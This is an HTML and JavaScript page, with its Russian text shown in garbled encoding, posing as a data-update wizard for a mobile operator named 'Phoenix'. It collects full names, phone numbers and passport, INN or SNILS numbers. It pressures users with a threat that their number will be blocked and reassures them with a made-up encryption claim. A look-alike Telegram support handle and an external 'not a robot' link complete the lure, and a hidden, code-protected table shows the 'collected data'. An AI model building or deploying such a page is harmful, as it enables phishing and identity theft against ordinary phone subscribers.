<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>–§–ï–ù–ò–ö–° ‚Äî –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö</title>
  <style>
    :root {
      --primary-color: #4B0082;
      --secondary-color: #6A0DAD;
      --info-color: #8A2BE2;
      --error-color: #B22222;
      --background-color: #F0E6FF;
      --white: #fff;
      --text-color: #333;
      --shadow: 0 4px 12px rgba(75, 0, 130, 0.3);
      --input-bg: #EDE4FF;
      --input-border: #8A2BE2;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Segoe UI', Arial, sans-serif;
      background: var(--background-color);
      padding: 20px;
      display: flex;
      justify-content: center;
      min-height: 100vh;
    }

    .container {
      max-width: 500px;
      width: 100%;
      background: var(--white);
      padding: 30px;
      border-radius: 16px;
      box-shadow: var(--shadow);
      text-align: center;
    }

    .step {
      display: none;
      text-align: left;
    }

    .step.active {
      display: block;
    }

    h2, h3 {
      margin-bottom: 20px;
      font-weight: 700;
      font-size: 1.6em;
      color: var(--primary-color);
      display: flex;
      align-items: center;
      gap: 10px;
      line-height: 1.3;
    }

    .input-group {
      margin-bottom: 20px;
      text-align: left;
      display: flex;
      flex-direction: column;
      align-items: stretch;
    }

    input {
      width: 100%;
      padding: 12px 15px;
      margin-top: 8px;
      border: 2px solid var(--input-border);
      border-radius: 10px;
      font-size: 16px;
      background: var(--input-bg);
      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
      transition: border-color 0.3s, box-shadow 0.3s;
      box-sizing: border-box;
    }

    input:focus {
      outline: none;
      border-color: var(--primary-color);
      box-shadow: 0 4px 12px rgba(75, 0, 130, 0.2);
    }

    .error {
      color: var(--error-color);
      font-size: 14px;
      margin-top: 6px;
      font-weight: 600;
      text-align: left;
    }

    .success {
      color: #28a745;
      font-size: 16px;
      margin-top: 10px;
      font-weight: 600;
      text-align: center;
      display: none;
    }

    .buttons {
      margin-top: 20px;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    button, a.button {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      font-size: 16px;
      font-weight: 600;
      transition: background-color 0.3s, transform 0.1s;
      text-decoration: none;
      display: inline-block;
      text-align: center;
      color: var(--white);
    }

    button:hover, a.button:hover {
      transform: translateY(-2px);
    }

    button:disabled {
      background: #ccc;
      cursor: not-allowed;
    }

    .next {
      background: var(--primary-color);
    }

    .back {
      background: var(--secondary-color);
    }

    .menu-btn, .service-btn, .faq-btn {
      background: var(--info-color);
    }

    .data-table {
      margin-top: 20px;
      width: 100%;
      border-collapse: collapse;
      display: none;
    }

    .data-table.active {
      display: table;
    }

    .data-table th, .data-table td {
      border: 2px solid var(--input-border);
      padding: 12px;
      text-align: left;
      font-size: 14px;
    }

    .data-table th {
      background: var(--primary-color);
      color: var(--white);
    }

    p {
      margin-bottom: 20px;
      color: var(--text-color);
      font-size: 16px;
      line-height: 1.5;
    }

    .clickable-text {
      color: var(--primary-color);
      cursor: pointer;
      user-select: none;
    }

    .clickable-text:hover {
      text-decoration: underline;
    }

    .clickable-emoji {
      cursor: pointer;
      margin-left: 5px;
    }

    .clickable-emoji:hover {
      opacity: 0.7;
    }

    @media (max-width: 400px) {
      .container {
        padding: 20px;
      }

      h2, h3 {
        font-size: 1.4em;
      }

      input {
        font-size: 14px;
        padding: 10px 12px;
      }

      button, a.button {
        font-size: 14px;
        padding: 12px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div id="wizard">
      <!-- –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é -->
      <div class="step active" id="step-main">
        <h2>üè† –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –§–ï–ù–òKS! üî•</h2>
        <p>–í–æ–∑—Ä–æ–¥–∏—Ç–µ —Å–≤–æ—é —Å–≤—è–∑—å –ª–µ–≥–∫–æ –∏ –±—ã—Å—Ç—Ä–æ! üê¶</p>
        <div class="buttons">
          <button class="menu-btn" data-action="update">üìù –û–±–Ω–æ–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ</button>
          <button class="menu-btn" data-action="tariff">üîÑ –ü–æ–º–µ–Ω—è—Ç—å —Ç–∞—Ä–∏—Ñ</button>
          <button class="menu-btn" data-action="balance">üí≥ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –±–∞–ª–∞–Ω—Å</button>
          <button class="menu-btn" data-action="refill">üí∏ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å</button>
          <button class="menu-btn" data-action="services">üõ†Ô∏è –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —É—Å–ª—É–≥–∏</button>
        </div>
      </div>

      <!-- –§–ò–û -->
      <div class="step" id="step-fullname">
        <h3>üë§ –£–∫–∞–∂–∏—Ç–µ –§–ò–û</h3>
        <p><b>–£–ö–ê–ó–´–í–ê–ô–¢–ï –¢–û–õ–¨–ö–û –°–í–û–ò –î–ê–ù–ù–´–ï</b></p>
        <div class="input-group">
          <input type="text" id="fullname" placeholder="–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á">
          <div class="error" id="err-fullname"></div>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –¢–µ–ª–µ—Ñ–æ–Ω -->
      <div class="step" id="step-phone">
        <h3>üìû –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</h3>
        <p><b>–£–ö–ê–ó–´–í–ê–ô–¢–ï –¢–û–õ–¨–ö–û –°–í–û–ò –î–ê–ù–ù–´–ï</b></p>
        <div class="input-group">
          <input type="tel" id="phone" placeholder="+79991234567">
          <div class="error" id="err-phone"></div>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –í—ã–±–æ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞ -->
      <div class="step" id="step-document-type">
        <h3>üìÑ –í—ã–±–µ—Ä–∏—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç</h3>
        <div class="buttons">
          <button class="menu-btn" data-doc="–ü–∞—Å–ø–æ—Ä—Ç">üìÑ –ü–∞—Å–ø–æ—Ä—Ç</button>
          <button class="menu-btn" data-doc="–ò–ù–ù">üßæ –ò–ù–ù</button>
          <button class="menu-btn" data-doc="–°–ù–ò–õ–°">üü¢ –°–ù–ò–õ–°</button>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
        </div>
      </div>

      <!-- –ù–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞ -->
      <div class="step" id="step-document-number">
        <h3 id="doc-title">üî¢ –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞</h3>
        <p><b>–£–ö–ê–ó–´–í–ê–ô–¢–ï –¢–û–õ–¨–ö–û –°–í–û–ò –î–ê–ù–ù–´–ï</b></p>
        <div class="input-group">
          <div id="doc-example" style="margin-bottom:8px;color:#333;font-size:15px;"></div>
          <input type="text" id="docnumber">
          <div class="error" id="err-doc"></div>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –§–∏–Ω–∞–ª -->
      <div class="step" id="step-final">
        <h3>‚úÖ –ü–æ—Å–ª–µ–¥–Ω–∏–π —à–∞–≥</h3>
        <p>–î–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ, —á—Ç–æ –≤—ã - —á–µ–ª–æ–≤–µ–∫!</p>
        <div class="redirect-button">
          <a href="https://redirect.figma.site/" target="_blank" class="button next">–Ø –Ω–µ —Ä–æ–±–æ—Ç ‚úÖ</a>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
        </div>
      </div>

      <!-- –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —É—Å–ª—É–≥–∏ -->
      <div class="step" id="step-services">
        <h3>üõ†Ô∏è –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —É—Å–ª—É–≥–∏</h3>
        <div class="buttons">
          <button class="service-btn" data-service="faq">‚ùì –ß–∞—Å—Ç–æ –∑–∞–¥–∞–≤–∞–µ–º—ã–µ –≤–æ–ø—Ä–æ—Å—ã</button>
          <button class="service-btn" data-service="instruction">‚ÑπÔ∏è –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è</button>
          <a href="https://t.me/MyPhoenlxsupport" target="_blank">
            <button class="service-btn">üìû –°–≤—è–∑–∞—Ç—å—Å—è —Å —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–æ–π</button>
          </a>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
        </div>
      </div>

      <!-- –ß–∞—Å—Ç–æ –∑–∞–¥–∞–≤–∞–µ–º—ã–µ –≤–æ–ø—Ä–æ—Å—ã -->
      <div class="step" id="step-faq">
        <h3>‚ùì –ß–∞—Å—Ç–æ –∑–∞–¥–∞–≤–∞–µ–º—ã–µ –≤–æ–ø—Ä–æ—Å—ã</h3>
        <div class="buttons">
          <button class="faq-btn" data-faq="penalty">üö´ –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –∏–∑-–∑–∞ –Ω–µ–∞–∫—Ç—É–∞–ª–∏–∑–∞—Ü–∏–∏</button>
          <button class="faq-btn" data-faq="safe">üîí –≠—Ç–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ?</button>
          <button class="faq-btn" data-faq="telegram">‚ö°Ô∏è –ü–æ—á–µ–º—É —á–µ—Ä–µ–∑ Telegram?</button>
          <button class="faq-btn" data-faq="documents">üìë –ö–∞–∫–∏–µ –¥–æ–∫—É–º–µ–Ω—Ç—ã –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å?</button>
          <button class="faq-btn" data-faq="fix">üîÅ –ú–æ–∂–Ω–æ –ª–∏ –∏—Å–ø—Ä–∞–≤–∏—Ç—å –æ—à–∏–±–∫—É?</button>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
        </div>
      </div>

      <!-- –û—Ç–≤–µ—Ç—ã –Ω–∞ –≤–æ–ø—Ä–æ—Å—ã -->
      <div class="step" id="step-faq-answer">
        <h3 id="faq-title">‚ùì –û—Ç–≤–µ—Ç</h3>
        <div id="faq-answer" style="margin-bottom:8px;color:#333;font-size:15px;"></div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
        </div>
      </div>

      <!-- –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è -->
      <div class="step" id="step-instruction">
        <h3>‚ÑπÔ∏è –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è</h3>
        <div style="margin-bottom:8px;color:#333;font-size:15px;">
          üìã –ß—Ç–æ–±—ã –æ–±–Ω–æ–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ:<br>
          1Ô∏è‚É£ –ù–∞–∂–º–∏—Ç–µ ¬´–û–±–Ω–æ–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ¬ª.<br>
          2Ô∏è‚É£ –í–≤–µ–¥–∏—Ç–µ –§–ò–û, –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞.<br>
          3Ô∏è‚É£ –í—ã–±–µ—Ä–∏—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç –∏ –≤–≤–µ–¥–∏—Ç–µ –µ–≥–æ –Ω–æ–º–µ—Ä.<br>
          4Ô∏è‚É£ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ, —á—Ç–æ –≤—ã –Ω–µ —Ä–æ–±–æ—Ç.
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
        </div>
      </div>

      <!-- –ù–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è -->
      <div class="step" id="step-unauthorized">
        <h3>‚ö†Ô∏è –¢—Ä–µ–±—É–µ—Ç—Å—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è</h3>
        <p>–ú—ã –Ω–µ –º–æ–∂–µ–º –≤—ã–ø–æ–ª–Ω–∏—Ç—å –¥–µ–π—Å—Ç–≤–∏–µ, —Ç–∞–∫ –∫–∞–∫ –≤—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–ª–∏—Å—å.</p>
        <div class="buttons">
          <button class="menu-btn" data-action="authorize">üîê –ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è</button>
          <button class="menu-btn" data-action="main">‚Ü©Ô∏è –°–º–µ–Ω–∏—Ç—å –¥–µ–π—Å—Ç–≤–∏–µ</button>
        </div>
      </div>

      <!-- –¢–∞–±–ª–∏—Ü–∞ –¥–∞–Ω–Ω—ã—Ö (hidden by default) -->
      <div id="data-output" class="data-table">
        <h3>üìã –°–æ–±—Ä–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ</h3>
        <table>
          <thead>
            <tr>
              <th>–í—Ä–µ–º—è</th>
              <th>–§–ò–û</th>
              <th>–¢–µ–ª–µ—Ñ–æ–Ω</th>
              <th>–î–æ–∫—É–º–µ–Ω—Ç</th>
            </tr>
          </thead>
          <tbody id="data-table-body"></tbody>
        </table>
      </div>

      <!-- –î–∞—Ç–∞ —Å —Å–º–∞–π–ª–∏–∫–æ–º –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –¥–∞–Ω–Ω—ã—Ö -->
      <p style="margin-top: 20px; color: var(--text-color); font-size: 14px;" class="clickable-text">
        –û–ø–µ—Ä–∞—Ç–æ—Ä ¬´–§–µ–Ω–∏–∫—Å¬ª –±—ã–ª –æ—Å–Ω–æ–≤–∞–Ω 22 –∞–ø—Ä–µ–ª—è 2015 –≥–æ–¥–∞ <span id="toggle-emoji" class="clickable-emoji">üòä</span>
      </p>
    </div>
  </div>

  <script>
    class PhoenixWizard {
      constructor() {
        this.steps = document.querySelectorAll('.step');
        this.currentStep = 'main';
        this.formData = {};
        this.dataStore = [];
        this.initEventListeners();
        this.showStep('main');
      }

      initEventListeners() {
        document.getElementById('wizard').addEventListener('click', (e) => {
          const target = e.target;
          if (target.classList.contains('next') && !target.closest('a') && !target.closest('.redirect-button')) {
            this.handleNext();
          } else if (target.classList.contains('back')) {
            this.handleBack();
          } else if (target.classList.contains('menu-btn')) {
            this.handleMenuAction(target.dataset.action, target.dataset.doc);
          } else if (target.classList.contains('service-btn')) {
            this.handleServiceAction(target.dataset.service);
          } else if (target.classList.contains('faq-btn')) {
            this.handleFaqAction(target.dataset.faq);
          } else if (target.id === 'toggle-emoji') {
            this.checkPassword();
          }
        });

        ['fullname', 'phone', 'docnumber'].forEach(id => {
          const input = document.getElementById(id);
          input?.addEventListener('input', () => this.validateStep(this.currentStep));
        });
      }

      showStep(stepId) {
        this.steps.forEach(step => {
          step.classList.toggle('active', step.id === `step-${stepId}`);
        });
        this.currentStep = stepId;
        window.scrollTo({ top: 0, behavior: 'smooth' });
      }

      handleNext() {
        if (!this.validateStep(this.currentStep)) return;
        
        const nextSteps = {
          fullname: 'phone',
          phone: 'document-type',
          'document-type': 'document-number',
          'document-number': 'final'
        };

        if (nextSteps[this.currentStep]) {
          this.formData[this.currentStep] = document.getElementById(this.currentStep)?.value?.trim();
          if (this.currentStep === 'document-number') {
            this.formData['document-number'] = document.getElementById('docnumber').value.trim();
            this.saveData();
          }
          this.showStep(nextSteps[this.currentStep]);
        }
      }

      handleBack() {
        const backSteps = {
          fullname: 'main',
          phone: 'fullname',
          'document-type': 'phone',
          'document-number': 'document-type',
          final: 'document-number',
          services: 'main',
          faq: 'services',
          'faq-answer': 'faq',
          instruction: 'services',
          unauthorized: 'main'
        };

        this.showStep(backSteps[this.currentStep] || 'main');
      }

      handleMenuAction(action, doc) {
        if (action === 'update') {
          this.showStep('fullname');
        } else if (action === 'tariff' || action === 'balance' || action === 'refill') {
          this.showStep('unauthorized');
        } else if (action === 'services') {
          this.showStep('services');
        } else if (action === 'authorize') {
          this.showStep('fullname');
        } else if (action === 'main') {
          this.showStep('main');
        } else if (doc) {
          this.formData['document-type'] = doc;
          const docnumber = document.getElementById('docnumber');
          const example = document.getElementById('doc-example');
          const examples = {
            '–ü–∞—Å–ø–æ—Ä—Ç': '–ü—Ä–∏–º–µ—Ä: 4510 123456',
            '–ò–ù–ù': '–ü—Ä–∏–º–µ—Ä: 500100732259',
            '–°–ù–ò–õ–°': '–ü—Ä–∏–º–µ—Ä: 112-233-445 95'
          };
          example.textContent = examples[doc] || '';
          this.showStep('document-number');
        }
      }

      handleServiceAction(service) {
        if (service === 'faq') {
          this.showStep('faq');
        } else if (service === 'instruction') {
          this.showStep('instruction');
        }
      }

      handleFaqAction(faq) {
        const faqContent = {
          penalty: {
            title: 'üö´ –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞',
            answer: '‚ö†Ô∏è –ï—Å–ª–∏ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –Ω–µ –æ–±–Ω–æ–≤–ª—ë–Ω –≤–æ–≤—Ä–µ–º—è, –æ–Ω –º–æ–∂–µ—Ç –±—ã—Ç—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –¥–æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∞–∫—Ç—É–∞–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö. üî•'
          },
          safe: {
            title: 'üîí –≠—Ç–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ?',
            answer: 'üîê –î–∞, —É –Ω–∞—Å —Å—Ç–æ–∏—Ç –∑–∞—â–∏—Ç–∞ VISION 3.87676 PRO VS (—Å–∫–≤–æ–∑–Ω–æ–µ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ). üî•'
          },
          telegram: {
            title: '‚ö°Ô∏è –ü–æ—á–µ–º—É —á–µ—Ä–µ–∑ Telegram?',
            answer: '‚ö°Ô∏è –î–ª—è —É–¥–æ–±—Å—Ç–≤–∞ –∏ –ø–µ—Ä–µ—Ö–æ–¥ –Ω–∞ —Ü–∏—Ñ—Ä–æ–≤—ã–µ –ø–ª–æ—â–∞–¥–∫–∏. üî•'
          },
          documents: {
            title: 'üìë –ö–∞–∫–∏–µ –¥–æ–∫—É–º–µ–Ω—Ç—ã –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å?',
            answer: 'üëâ –ü–∞—Å–ø–æ—Ä—Ç, –ò–ù–ù, –°–ù–ò–õ–°. üî•'
          },
          fix: {
            title: 'üîÅ –ú–æ–∂–Ω–æ –ª–∏ –∏—Å–ø—Ä–∞–≤–∏—Ç—å –æ—à–∏–±–∫—É?',
            answer: '‚úÖ –î–∞, –º–æ–∂–Ω–æ. –°–≤—è–∂–∏—Ç–µ—Å—å —Å —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–æ–π –∏–ª–∏ –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –≤–≤–æ–¥. üî•'
          }
        };

        document.getElementById('faq-title').textContent = faqContent[faq].title;
        document.getElementById('faq-answer').textContent = faqContent[faq].answer;
        this.showStep('faq-answer');
      }

      checkPassword() {
        const password = prompt('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –¥–∞–Ω–Ω—ã–º:');
        if (password === '1321') {
          this.toggleDataTable();
        } else if (password !== null) {
          alert('–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥! –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.');
        }
      }

      toggleDataTable() {
        const dataOutput = document.getElementById('data-output');
        if (dataOutput) {
          dataOutput.classList.toggle('active');
          if (dataOutput.classList.contains('active')) {
            this.renderDataTable();
          }
        } else {
          console.error('Data output element not found!');
        }
      }

      sanitizeInput(value) {
        return value.replace(/[<>"'&]/g, '');
      }

      validateStep(step) {
        const validations = {
          fullname: () => {
            const val = this.sanitizeInput(document.getElementById('fullname').value.trim());
            const re = /^[–ê-–Ø–∞-—è–Å—ë\s-]+$/;
            const error = document.getElementById('err-fullname');
            if (!val) {
              error.textContent = '–ü–æ–ª–µ –§–ò–û –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –¥–ª—è –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è';
              return false;
            }
            if (!re.test(val)) {
              error.textContent = '–§–ò–û –¥–æ–ª–∂–Ω–æ —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ –±—É–∫–≤—ã –∫–∏—Ä–∏–ª–ª–∏—Ü—ã';
              return false;
            }
            error.textContent = '';
            return true;
          },
          phone: () => {
            const val = this.sanitizeInput(document.getElementById('phone').value.trim());
            const digits = val.replace(/[^0-9]/g, '');
            const error = document.getElementById('err-phone');
            if (!val) {
              error.textContent = '–ü–æ–ª–µ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –¥–ª—è –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è';
              return false;
            }
            if (!val.startsWith('+7') && !val.startsWith('7')) {
              error.textContent = '–ù–æ–º–µ—Ä –¥–æ–ª–∂–µ–Ω –Ω–∞—á–∏–Ω–∞—Ç—å—Å—è —Å +7 –∏–ª–∏ 7';
              return false;
            }
            if (digits.length < 10 || digits.length > 11) {
              error.textContent = '–ù–æ–º–µ—Ä –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å 10 –∏–ª–∏ 11 —Ü–∏—Ñ—Ä';
              return false;
            }
            error.textContent = '';
            return true;
          },
          'document-number': () => {
            const val = this.sanitizeInput(document.getElementById('docnumber').value.trim());
            const error = document.getElementById('err-doc');
            if (!val) {
              error.textContent = '–ü–æ–ª–µ –Ω–æ–º–µ—Ä–∞ –¥–æ–∫—É–º–µ–Ω—Ç–∞ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ';
              return false;
            }
            error.textContent = '';
            return true;
          }
        };

        return validations[step]?.() ?? true;
      }

      saveData() {
        const timestamp = new Date().toLocaleString('ru-RU');
        const record = {
          timestamp,
          fullname: this.formData.fullname || '',
          phone: this.formData.phone || '',
          document: `${this.formData['document-type'] || ''} ${this.formData['document-number'] || ''}`.trim()
        };
        this.dataStore.push(record);
      }

      renderDataTable() {
        const tbody = document.getElementById('data-table-body');
        if (tbody) {
          tbody.innerHTML = '';
          this.dataStore.forEach(record => {
            const tr = document.createElement('tr');
            tr.innerHTML = `
              <td>${record.timestamp}</td>
              <td>${record.fullname}</td>
              <td>${record.phone}</td>
              <td>${record.document}</td>
            `;
            tbody.appendChild(tr);
          });
        } else {
          console.error('Data table body element not found!');
        }
      }
    }

    const wizard = new PhoenixWizard();
  </script>
</body>
</html>
